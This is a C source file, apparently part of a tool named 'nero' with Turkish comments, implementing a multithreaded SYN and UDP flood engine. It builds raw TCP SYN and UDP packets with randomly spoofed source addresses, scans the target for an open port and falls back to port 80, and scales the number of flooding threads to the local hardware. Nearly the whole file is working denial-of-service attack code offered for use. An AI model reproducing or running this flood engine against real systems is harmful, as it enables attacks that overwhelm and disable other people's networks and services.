/* Legacy Linux traffic engine. Its worker and signal lifecycle is separate
 * from the shell; macOS production diagnostics are handled in commands.c.
 * Platform build rules decide whether this implementation is linked. */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <pthread.h>
#include <time.h>
#include <sys/socket.h>
#include <sys/resource.h>
#include <arpa/inet.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <netinet/in.h>
#include <signal.h>
#include <stdatomic.h>
#ifndef _WIN32
#include <poll.h>
#endif
#include <netinet/udp.h>  // struct udphdr

#include "nero/ascii.h"
#include "nero/hardware.h"
#include "nero/log.h"
#include "nero/terminal.h"
#include "nero/portscanner.h"
#include "nero/syn_flood_powered.h"

/* PACKET_SIZE is the datagram buffer ceiling; the operator selects a smaller
 * size at run time through the settings prompt. The worker count is not a
 * compile-time ceiling anymore: the per-run array is sized from the selected
 * value (bounded by NERO_SYN_THREAD_HARD_MAX) and allocated in SYN_Flood(). */
#define PACKET_SIZE NERO_SYN_PACKET_SIZE_MAX

// Global state
volatile sig_atomic_t row;
int port_select;

extern pthread_mutex_t ekran_mutex;

volatile sig_atomic_t stop_flag = 0;

/* Run-time engine settings selected through the pre-start prompt. The worker
 * default is replaced by the hardware suggestion when one is available; the
 * packet default is the historical compile-time value. Both stay within the
 * public header bounds so the datagram buffer always covers the selection. */
static long syn_thread_count = NERO_SYN_THREAD_COUNT;
static long syn_packet_size  = PACKET_SIZE;

/* Number of flood workers still alive.  When the last worker exits (for
 * example because raw sockets could not be opened) the animation thread is
 * released instead of spinning forever. */
static atomic_int active_workers = 0;

pthread_t animasyon_thread;

// Pseudo-header for TCP/UDP checksum calculation
struct pseudo_header {
    uint32_t source_address;
    uint32_t dest_address;
    uint8_t  placeholder;
    uint8_t  protocol;
    uint16_t tcp_length;
};

#if defined(__APPLE__)
/* macOS exposes BSD's struct ip, not Linux's struct iphdr.  Keep the
 * Linux-style field names used by this legacy packet builder local to the
 * implementation so the header is complete when taking its address. */
struct nero_iphdr {
    uint8_t ihl:4;
    uint8_t version:4;
    uint8_t tos;
    uint16_t tot_len;
    uint16_t id;
    uint16_t frag_off;
    uint8_t ttl;
    uint8_t protocol;
    uint16_t check;
    uint32_t saddr;
    uint32_t daddr;
};
#else
/* Linux keeps the kernel header's exact layout and endianness handling. */
#define nero_iphdr iphdr
#endif

/* Compile-time sanity check: the kernel expects exactly 20 bytes for IPv4. */
_Static_assert(sizeof(struct nero_iphdr) == 20, "struct iphdr layout mismatch");

/* Darwin's IP_HDRINCL expects ip_len and ip_off in host byte order, while
 * glibc expects network byte order.  These helpers keep both call sites and
 * the IPv4 checksum (which is always computed over wire-format bytes) correct. */
#if defined(__APPLE__)
#define NERO_IP_LEN_SET(iph, value) ((iph)->tot_len = (uint16_t)(value))
#define NERO_IP_LEN_GET(iph) ((int)(iph)->tot_len)
#else
#define NERO_IP_LEN_SET(iph, value) ((iph)->tot_len = htons((uint16_t)(value)))
#define NERO_IP_LEN_GET(iph) ((int)ntohs((iph)->tot_len))
#endif

typedef struct {
    const char *target_ip;
    int thread_count;
} AnimationArgs;

/* 32-bit rastgele kaynak IP üretir.
 *
 * rand_r() glibc'de yalnızca 15 bit (0..32767) döndürür.  Bu yüzden
 * `htonl((uint32_t)rand_r(&seed))` kaynak IP'nin üst iki oktetini her
 * zaman 0 yapar.  4 bağımsız `% 256` çağrısıyla tam 32-bit entropi
 * üretiyoruz.
 *
 * Ayrıca kernel `raw_send_hdrinc` içinde multicast (224.0.0.0/4),
 * zero-net (0.0.0.0/8) ve limited-broadcast (255.255.255.255) kaynak
 * adresleri `EINVAL` ile reddeder.  Bunları üretimden dışlıyoruz. */
static inline uint32_t random_src_ip(unsigned int *seed) {
    for (;;) {
        uint32_t a = rand_r(seed) % 256;
        uint32_t b = rand_r(seed) % 256;
        uint32_t c = rand_r(seed) % 256;
        uint32_t d = rand_r(seed) % 256;
        if (a == 0 || a == 127 || a >= 224)   /* zero-net, loopback, multicast/broadcast */
            continue;
        return htonl((a << 24) | (b << 16) | (c << 8) | d);
    }
}

// Signal handler for Ctrl+C: only async-signal-safe calls.
void sigint_handler(int sig) {
    (void)sig;
    stop_flag = 1;
    char seq[32];
    size_t len = 0;
    seq[len++] = '\033';
    seq[len++] = '[';
    int value = row > 0 ? row : 1;
    char digits[12];
    int ndigits = 0;
    do {
        digits[ndigits++] = (char)('0' + value % 10);
        value /= 10;
    } while (value > 0 && ndigits < (int)sizeof(digits));
    while (ndigits > 0 && len < sizeof(seq) - 5)
        seq[len++] = digits[--ndigits];
    seq[len++] = ';';
    seq[len++] = '1';
    seq[len++] = 'H';
    seq[len++] = '\033';
    seq[len++] = '[';
    seq[len++] = 'J';
    (void)write(STDOUT_FILENO, seq, len);
}

/* RFC 1071 Internet checksum.  Returns the one's-complement sum in host
 * byte order (callers store it directly into the header field). */
static unsigned short checksum(unsigned short *ptr, int nbytes) {
    long sum = 0;
    unsigned short oddbyte;
    unsigned short answer;

    while (nbytes > 1) {
        sum += *ptr++;
        nbytes -= 2;
    }
    if (nbytes == 1) {
        oddbyte = 0;
        *((uint8_t *)&oddbyte) = *(uint8_t *)ptr;
        sum += oddbyte;
    }
    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    answer = (unsigned short)(~sum);
    return answer;
}

/* IPv4 checksum must be computed over the wire representation of the header.
 * On Darwin tot_len is stored in host order, so swap it temporarily. */
static unsigned short ip_checksum(struct nero_iphdr *iph) {
#if defined(__APPLE__)
    uint16_t saved = iph->tot_len;
    iph->tot_len = htons(saved);
    unsigned short result = checksum((unsigned short *)iph, iph->ihl * 4);
    iph->tot_len = saved;
    return result;
#else
    return checksum((unsigned short *)iph, iph->ihl * 4);
#endif
}

int is_target_online(const char *ip) {
    // Reject anything that is not a dotted-quad IPv4 before shelling out:
    // the ping command below is passed to /bin/sh, so unvalidated input
    // would allow shell metacharacters in `ip` to execute arbitrary commands.
    struct in_addr addr;
    if (inet_pton(AF_INET, ip, &addr) != 1)
        return 0;

    char command[128];
#if defined(__APPLE__)
    /* Darwin interprets -W as milliseconds; Linux interprets it as seconds. */
    int written = snprintf(command, sizeof(command),
                           "ping -c 1 -W 1000 %s > /dev/null 2>&1", ip);
#else
    int written = snprintf(command, sizeof(command),
                           "ping -c 1 -W 1 %s > /dev/null 2>&1", ip);
#endif
    if (written < 0 || (size_t)written >= sizeof(command))
        return 0;

    int status = system(command);

    // A zero system() result indicates a successful ping
    return (status == 0);
}

/* Runs when a worker exits, whether normally or through pthread_exit(). */
static void flood_worker_cleanup(void *unused)
{
    (void)unused;
    if (atomic_fetch_sub_explicit(&active_workers, 1, memory_order_relaxed) == 1)
        stop_flag = 1;
}

// Thread function: continuously send SYN + UDP packets to target IP
static void *flood(void *arg)
{
    const char *target_ip = (const char *)arg;
    atomic_fetch_add_explicit(&active_workers, 1, memory_order_relaxed);
    pthread_cleanup_push(flood_worker_cleanup, NULL);
    /* Per-thread PRNG state.  time(NULL) tek başına yeterli değil: aynı
     * saniyede başlayan thread'ler aynı seed'i alır.  pthread_self() ve
     * stack adresi karıştırarak thread'leri ayır. */
    unsigned int seed = (unsigned int)time(NULL)
                      ^ (unsigned int)(uintptr_t)pthread_self()
                      ^ (unsigned int)(uintptr_t)&arg
                      ^ (unsigned int)(uintptr_t)&seed;

    struct sockaddr_in sin;
    memset(&sin, 0, sizeof(sin));
    sin.sin_family = AF_INET;
#if defined(__APPLE__)
    sin.sin_len = sizeof(sin);
#endif
    sin.sin_port = htons(port_select);
    sin.sin_addr.s_addr = inet_addr(target_ip);

    // TCP socket
    int sock_tcp = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if (sock_tcp < 0) {
        perror("Failed to create TCP socket");
        pthread_exit(NULL);
    }

    int one = 1;
    if (setsockopt(sock_tcp, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) {
        perror("setsockopt TCP");
        close(sock_tcp);
        pthread_exit(NULL);
    }

    // UDP socket
    int sock_udp = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
    if (sock_udp < 0) {
        perror("Failed to create UDP socket");
        close(sock_tcp);
        pthread_exit(NULL);
    }

    if (setsockopt(sock_udp, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) {
        perror("setsockopt UDP");
        close(sock_tcp);
        close(sock_udp);
        pthread_exit(NULL);
    }

    char datagram[PACKET_SIZE];
    unsigned long tcp_sent = 0, udp_sent = 0;
    unsigned long tcp_err  = 0, udp_err  = 0;

    while (!stop_flag) {

        /* ---------------- TCP ---------------- */
        memset(datagram, 0, PACKET_SIZE);
        struct nero_iphdr *iph = (struct nero_iphdr *)datagram;
        struct tcphdr *tcph = (struct tcphdr *)(datagram + sizeof(struct nero_iphdr));

        /* 1) IP başlığı */
        iph->ihl = 5;
        iph->version = 4;
        iph->tos = 0;
        NERO_IP_LEN_SET(iph, sizeof(struct nero_iphdr) + sizeof(struct tcphdr));
        iph->id = htons(rand_r(&seed) % 65535);
        iph->frag_off = 0;
        iph->ttl = 255;
        iph->protocol = IPPROTO_TCP;
        iph->saddr = random_src_ip(&seed);
        iph->daddr = sin.sin_addr.s_addr;
        iph->check = 0;

        /* 2) TCP başlığı */
#if defined(__APPLE__)
        /* macOS (BSD): alan adları th_* önekli.  SYN ayrı bit değil,
         * th_flags içinde TH_SYN bayrağıdır. */
        tcph->th_sport = htons(rand_r(&seed) % 65535);
        tcph->th_dport = htons(port_select);
        tcph->th_seq   = rand_r(&seed);
        tcph->th_ack   = 0;
        tcph->th_off   = 5;
        tcph->th_flags = TH_SYN;
        tcph->th_win   = htons(32767 + rand_r(&seed) % (65536 - 32767));
        tcph->th_sum   = 0;
        tcph->th_urp   = 0;
#else
        tcph->source  = htons(rand_r(&seed) % 65535);
        tcph->dest    = htons(port_select);
        tcph->seq     = rand_r(&seed);
        tcph->ack_seq = 0;
        tcph->doff    = 5;
        tcph->syn     = 1;
        tcph->window  = htons(32767 + rand_r(&seed) % (65536 - 32767));
        tcph->check   = 0;
        tcph->urg_ptr = 0;
#endif

        /* 3) IP checksum — SADECE 20 byte (ihl * 4) */
        iph->check = ip_checksum(iph);

        /* 4) TCP checksum — pseudo-header + TCP başlığı */
        struct pseudo_header psh_tcp;
        psh_tcp.source_address = iph->saddr;
        psh_tcp.dest_address   = iph->daddr;
        psh_tcp.placeholder    = 0;
        psh_tcp.protocol       = IPPROTO_TCP;
        psh_tcp.tcp_length     = htons(sizeof(struct tcphdr));

        int psize_tcp = sizeof(struct pseudo_header) + sizeof(struct tcphdr);
        char *pseudogram_tcp = malloc(psize_tcp);
        if (!pseudogram_tcp) {
            close(sock_tcp);
            close(sock_udp);
            pthread_exit(NULL);
        }
        memcpy(pseudogram_tcp, &psh_tcp, sizeof(struct pseudo_header));
        memcpy(pseudogram_tcp + sizeof(struct pseudo_header), tcph, sizeof(struct tcphdr));
#if defined(__APPLE__)
        tcph->th_sum = checksum((unsigned short *)pseudogram_tcp, psize_tcp);
#else
        tcph->check = checksum((unsigned short *)pseudogram_tcp, psize_tcp);
#endif
        free(pseudogram_tcp);

        if (sendto(sock_tcp, datagram, NERO_IP_LEN_GET(iph), 0,
                   (struct sockaddr *)&sin, sizeof(sin)) < 0) {
            if (tcp_err == 0) perror("sendto tcp");
            tcp_err++;
        } else {
            tcp_sent++;
        }

        /* ---------------- UDP ---------------- */
        memset(datagram, 0, PACKET_SIZE);
        iph = (struct nero_iphdr *)datagram;
        struct udphdr *udph = (struct udphdr *)(datagram + sizeof(struct nero_iphdr));

        /* Deterministic payload: the operator-selected packet size minus the
         * 20-byte IP and 8-byte UDP headers (bounds checked in the prompt,
         * so this stays >= 32 and within the PACKET_SIZE buffer). */
        int payload_len = (int)(syn_packet_size
                                - sizeof(struct nero_iphdr)
                                - sizeof(struct udphdr));
        char *payload = datagram + sizeof(struct nero_iphdr) + sizeof(struct udphdr);
        for (int i = 0; i < payload_len; i++) {
            payload[i] = (char)(rand_r(&seed) % 256);
        }

        /* 1) IP başlığı */
        iph->ihl = 5;
        iph->version = 4;
        iph->tos = 0;
        NERO_IP_LEN_SET(iph, sizeof(struct nero_iphdr) + sizeof(struct udphdr) + payload_len);
        iph->id = htons(rand_r(&seed) % 65535);
        iph->frag_off = 0;
        iph->ttl = 255;
        iph->protocol = IPPROTO_UDP;
        iph->saddr = random_src_ip(&seed);
        iph->daddr = sin.sin_addr.s_addr;
        iph->check = 0;

        /* 2) UDP başlığı (payload zaten yazıldı) */
#if defined(__APPLE__)
        /* macOS (BSD): alan adları uh_* önekli. */
        udph->uh_sport = htons(rand_r(&seed) % 65535);
        udph->uh_dport = htons(port_select);
        udph->uh_ulen  = htons(sizeof(struct udphdr) + payload_len);
        udph->uh_sum   = 0;
#else
        udph->source = htons(rand_r(&seed) % 65535);
        udph->dest   = htons(port_select);
        udph->len    = htons(sizeof(struct udphdr) + payload_len);
        udph->check  = 0;
#endif

        /* 3) IP checksum — SADECE 20 byte */
        iph->check = ip_checksum(iph);

        /* 4) UDP checksum — pseudo-header + UDP başlığı + payload */
        struct pseudo_header psh_udp;
        psh_udp.source_address = iph->saddr;
        psh_udp.dest_address   = iph->daddr;
        psh_udp.placeholder    = 0;
        psh_udp.protocol       = IPPROTO_UDP;
        psh_udp.tcp_length     = htons(sizeof(struct udphdr) + payload_len);

        int psize_udp = sizeof(struct pseudo_header) + sizeof(struct udphdr) + payload_len;
        char *pseudogram_udp = malloc(psize_udp);
        if (!pseudogram_udp) {
            close(sock_tcp);
            close(sock_udp);
            pthread_exit(NULL);
        }
        memcpy(pseudogram_udp, &psh_udp, sizeof(struct pseudo_header));
        memcpy(pseudogram_udp + sizeof(struct pseudo_header), udph,
               sizeof(struct udphdr) + payload_len);
#if defined(__APPLE__)
        udph->uh_sum = checksum((unsigned short *)pseudogram_udp, psize_udp);
#else
        udph->check = checksum((unsigned short *)pseudogram_udp, psize_udp);
#endif
        free(pseudogram_udp);

        if (sendto(sock_udp, datagram, NERO_IP_LEN_GET(iph), 0,
                   (struct sockaddr *)&sin, sizeof(sin)) < 0) {
            if (udp_err == 0) perror("sendto udp");
            udp_err++;
        } else {
            udp_sent++;
        }
    }

    if (tcp_err || udp_err || tcp_sent || udp_sent) {
        fprintf(stderr,
                "[worker %p] sent tcp=%lu udp=%lu | errors tcp=%lu udp=%lu\n",
                (void *)pthread_self(), tcp_sent, udp_sent, tcp_err, udp_err);
    }

    close(sock_tcp);
    close(sock_udp);
    pthread_cleanup_pop(1);
    return NULL;
}

void *flood_animation(void *arg)
{
    const char *target_ip = (const char *)arg;
    int cerceve_sayisi = 4;
    struct timespec bekleme = {0, 600000000};
    const char *dots[] = {".  ", ".. ", "...", "...."};

    while (!stop_flag)
    {
        for (int i = 0; i < cerceve_sayisi; i++)
        {
            if (stop_flag) break;

            pthread_mutex_lock(&ekran_mutex);
            row = row_location_function();

            printf("\033[%d;1H", row);
            printf("\033[J");

            printf("\033[40m\033[1;31m[*] \033[1;34mSYN Flood \033[0m"
                   "\033[40m\033[1;33m%s \033[1;37mon "
                   "\033[40m\033[1;33m%d \033[1;37m"
                   "\033[1;32m%d \033[1;37mthread%s\033[0m\n\n",
                    target_ip, port_select, (int)syn_thread_count, dots[i]);

            fflush(stdout);

            printf("%s", windows[i]);
            fflush(stdout);
            nanosleep(&bekleme, NULL);

            pthread_mutex_unlock(&ekran_mutex);
        }
    }

    return NULL;
}

int port_get(const char *target_ip){
    int selected = portscanner(target_ip);
    if (selected < 0) {
        fprintf(stderr, "\n\033[49m[!]\033[0m\033[1;31m Port selection aborted.\033[0m\n");
        return -1;
    }
    if (selected == 0) {
        /* Keep packet transmission available even when the discovery scan
         * finds no listening port: fall back to the standard HTTP port. */
        port_select = 80;
        fprintf(stderr,
                "\n\033[49m[!]\033[0m\033[1;31m No open port found on %s; "
                "flooding default port 80.\033[0m\n",
                target_ip);
        return 0;
    }
    port_select = selected;
    return 0;
}

/* Verify that a raw IPv4 socket can be created before spawning the workers.
 * Without this probe a permission failure (missing root/CAP_NET_RAW) would
 * leave every worker exiting immediately while the animation thread keeps the
 * caller blocked. */
static int raw_sockets_available(void)
{
    int fd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if (fd < 0) return 0;
    close(fd);
    fd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
    if (fd < 0) return 0;
    close(fd);
    return 1;
}

/* ============================================================
 * RUN-TIME SETTINGS PROMPT
 * ============================================================ */

/* Input capacity: 8 digits covers the largest selectable values (65535 worker
 * threads, 4096 bytes) yet stays bounded, so a stuck keyboard repeat cannot
 * grow the line. */
#define SYN_PROMPT_INPUT_MAX 8

/* Drain a bracketed control sequence up to its final byte so a lone Escape
 * (cancel) stays distinguishable from arrow keys (ignored); same bounded
 * convention as the reader in src/cli/workload.c. */
static int syn_prompt_consume_escape_sequence(void)
{
    char byte;
    for (int index = 0; index < 32; ++index) {
        ssize_t status = read(STDIN_FILENO, &byte, 1);
        if (status <= 0)
            return -1;
        if ((unsigned char)byte >= 0x40 && (unsigned char)byte <= 0x7e)
            return 0;
    }
    return -1;
}

/* Raw-mode numeric prompt with local echo: the terminal session keeps
 * ICANON and ECHO off, so this function owns the echo and backspace.
 * Enter on an empty line accepts `default_value`; an entered value must be
 * a plain digit string within [min, max] (rejected input re-prompts, never
 * clamps). Returns 0 and stores the value in *out, or -1 when the operator
 * cancelled with Esc/q/Ctrl+C or stdin closed. */
static int syn_prompt_count(const char *prompt, long min, long max,
                            long default_value, long *out)
{
    char buffer[SYN_PROMPT_INPUT_MAX];

    for (;;) {
        printf("%s (%ld-%ld, Enter = %ld): ", prompt, min, max, default_value);
        fflush(stdout);

        size_t length = 0;
        buffer[0] = '\0';
        int cancelled = 0;

        for (;;) {
            char byte;
            ssize_t status = read(STDIN_FILENO, &byte, 1);
            if (status <= 0) {  /* stdin closed: treat as cancel */
                cancelled = 1;
                break;
            }
            if (byte == '\n' || byte == '\r') {
                putchar('\n');
                fflush(stdout);
                break;
            }
            if (byte == 27) {
                struct pollfd input = {STDIN_FILENO, POLLIN, 0};
                int ready = poll(&input, 1, 35);
                if (ready > 0 && (input.revents & POLLIN) != 0) {
                    if (syn_prompt_consume_escape_sequence() != 0) {
                        cancelled = 1;
                        break;
                    }
                    continue;  /* arrow key or similar: ignore, keep editing */
                }
                cancelled = 1;
                break;
            }
            if (byte == 'q' || byte == 'Q' || byte == 3) {
                cancelled = 1;
                break;
            }
            if (byte == 127 || byte == '\b') {
                if (length > 0) {
                    --length;
                    fputs("\b \b", stdout);
                    fflush(stdout);
                }
                continue;
            }
            if (byte < '0' || byte > '9')
                continue;  /* ignore every other byte, never echo it */
            if (length + 1 >= sizeof(buffer))
                continue;  /* bounded: extra digits make the parse fail */

            buffer[length++] = byte;
            putchar(byte);
            fflush(stdout);
        }

        if (cancelled)
            return -1;

        /* Empty entry: keep the default. */
        if (length == 0) {
            *out = default_value;
            return 0;
        }

        buffer[length] = '\0';
        long value = 0;
        if (nero_count_parse(buffer, min, max, &value) != 0) {
            printf("Invalid value; enter a whole number between %ld and %ld.\n",
                   min, max);
            continue;
        }
        *out = value;
        return 0;
    }
}

/* Prints the measured local hardware plus the suggested worker ceiling at the
 * top of the settings prompt, so the operator sees "how high to go" before
 * choosing a count. */
static void syn_print_hardware(const nero_hardware_info *info, long suggested)
{
    fputs("Hardware: ", stdout);
    if (info->cpu_logical > 0)
        printf("%ld logical CPU%s", info->cpu_logical,
               info->cpu_logical == 1 ? "" : "s");
    else
        fputs("CPU count unavailable", stdout);

    if (info->ram_total_bytes != NERO_HARDWARE_UNAVAILABLE) {
        const unsigned long long gib = 1024ULL * 1024 * 1024;
        printf(", %llu.%llu GiB RAM",
               info->ram_total_bytes / gib,
               (info->ram_total_bytes % gib) * 10 / gib);
    } else {
        fputs(", RAM unavailable", stdout);
    }
    putchar('\n');
    printf("Suggested max worker threads: %ld\n", suggested);
}

/* Asks the operator to pick the worker count and the packet size before any
 * thread or socket for the run is created. The worker default is the local
 * hardware suggestion, but the accepted range extends to the absolute safety
 * bound so the old fixed 512 ceiling no longer applies. Returns 0 on success
 * (globals updated) or -1 when cancelled, in which case -Syn must not start. */
static int syn_prompt_settings(void)
{
    nero_hardware_info info;
    char reason[256];
    nero_hardware_probe(&info);

    long suggested =
        nero_workload_suggested_workers(&info, reason, sizeof(reason));
    if (suggested <= 0) {
        suggested = NERO_SYN_THREAD_COUNT;
        snprintf(reason, sizeof(reason),
                 "hardware recommendation unavailable; using fallback %ld",
                 suggested);
    }
    if (suggested > NERO_SYN_THREAD_HARD_MAX)
        suggested = NERO_SYN_THREAD_HARD_MAX;

    /* Each run starts from the documented defaults instead of silently
     * carrying a previous manual entry forward. */
    syn_thread_count = suggested;
    syn_packet_size  = PACKET_SIZE;

    fputs("\nNERO - -Syn engine settings (Enter accepts the default, "
          "Esc cancels)\n", stdout);
    syn_print_hardware(&info, suggested);
    printf("Recommendation: %s\n", reason);
    fputs("TCP leg: header-only SYN (40 B). Packet size sets the UDP "
          "datagram size\n"
          "(payload = packet size - 28 B of headers).\n\n", stdout);
    fflush(stdout);

    if (syn_prompt_count("Worker thread count", 1, NERO_SYN_THREAD_HARD_MAX,
                         suggested, &syn_thread_count) != 0)
        return -1;
    if (syn_prompt_count("Packet size (bytes)", NERO_SYN_PACKET_SIZE_MIN,
                         PACKET_SIZE, PACKET_SIZE, &syn_packet_size) != 0)
        return -1;

    nero_log_write(NERO_LOG_INFO, "syn",
                   "Engine settings selected: threads=%ld packet_size=%ld",
                   syn_thread_count, syn_packet_size);
    return 0;
}

// Starts the selected number of flood workers against the provided target IP
int SYN_Flood(const char *target_ip) {
    stop_flag = 0;
    atomic_init(&active_workers, 0);

#if defined(__APPLE__)
    /* Raw IPv4 sockets require root on macOS.  Report the requirement before
     * starting any worker so the failure is actionable instead of a per-thread
     * "Operation not permitted". */
    if (geteuid() != 0) {
        fprintf(stderr,
                "\n\033[49m[!]\033[0m\033[1;31m Raw packet sockets require "
                "root on macOS: run with sudo.\033[0m\n");
        return 1;
    }
#endif

    if (!raw_sockets_available()) {
        fprintf(stderr,
                "\n\033[49m[!]\033[0m\033[1;31m Cannot open raw IPv4 sockets; "
                "root or CAP_NET_RAW is required.\033[0m\n");
        return 1;
    }

    /* Settings are picked before the port selection and before any worker is
     * spawned; cancelling here leaves the system untouched. */
    if (syn_prompt_settings() != 0) {
        fprintf(stderr,
                "\n\033[49m[!]\033[0m\033[1;31m Cancelled; -Syn not "
                "started.\033[0m\n");
        return 1;
    }

    /* syn_thread_count x 2 raw sockets + headroom; default RLIMIT_NOFILE is
     * usually 1024 and would silently fail late threads. */
    struct rlimit rl;
    if (getrlimit(RLIMIT_NOFILE, &rl) == 0) {
        rlim_t want = (rlim_t)(syn_thread_count * 2 + 64);
        if (rl.rlim_cur < want) {
            rl.rlim_cur = (rl.rlim_max == RLIM_INFINITY || rl.rlim_max >= want)
                          ? want : rl.rlim_max;
            (void)setrlimit(RLIMIT_NOFILE, &rl);
        }
    }

    if (port_get(target_ip) != 0)
        return 1;

    struct sigaction sa;
    memset(&sa, 0, sizeof(sa));
    sa.sa_handler = sigint_handler;
    sigemptyset(&sa.sa_mask);
    sa.sa_flags = 0;

    /* Reachability is advisory: ICMP may be filtered even when the target is
     * up, so never block packet transmission because of it. */
    if (!is_target_online(target_ip)) {
        fprintf(stderr,
                "\n\033[49m[!]\033[0m\033[1;33m Target %s did not answer "
                "ping; continuing anyway.\033[0m\n",
                target_ip);
    }

    struct sigaction previous_sa;
    if (sigaction(SIGINT, &sa, &previous_sa) == -1) {
        perror("sigaction");
        return 1;
    }

    srand(time(NULL));

    /* The worker count is selected at run time, so the handle array is sized
     * per run instead of using a fixed 512-slot static array. */
    pthread_t *threads = calloc((size_t)syn_thread_count, sizeof(*threads));
    if (threads == NULL) {
        fprintf(stderr, "Failed to allocate handles for %ld worker threads\n",
                syn_thread_count);
        sigaction(SIGINT, &previous_sa, NULL);
        return 1;
    }

    if (pthread_create(&animasyon_thread, NULL, flood_animation, (void *)target_ip) != 0) {
        fprintf(stderr, "Failed to create animation thread\n");
        free(threads);
        sigaction(SIGINT, &previous_sa, NULL);
        return 1;
    }

    int threads_created = 0;
    for (int i = 0; i < (int)syn_thread_count; i++) {
        if (pthread_create(&threads[i], NULL, flood, (void *)target_ip) != 0) {
            fprintf(stderr, "Failed to create thread %d\n", i);
            break;
        }
        threads_created++;
    }

    if (threads_created == 0)
        stop_flag = 1;
    for (int i = 0; i < threads_created; i++)
        pthread_join(threads[i], NULL);
    pthread_join(animasyon_thread, NULL);
    sigaction(SIGINT, &previous_sa, NULL);
    free(threads);
    printf("[-]Thread\n");

    if (threads_created != (int)syn_thread_count) {
        fprintf(stderr, "Failed to start all flood threads (%d of %ld)\n",
                threads_created, syn_thread_count);
        return 1;
    }

    return 0;
}
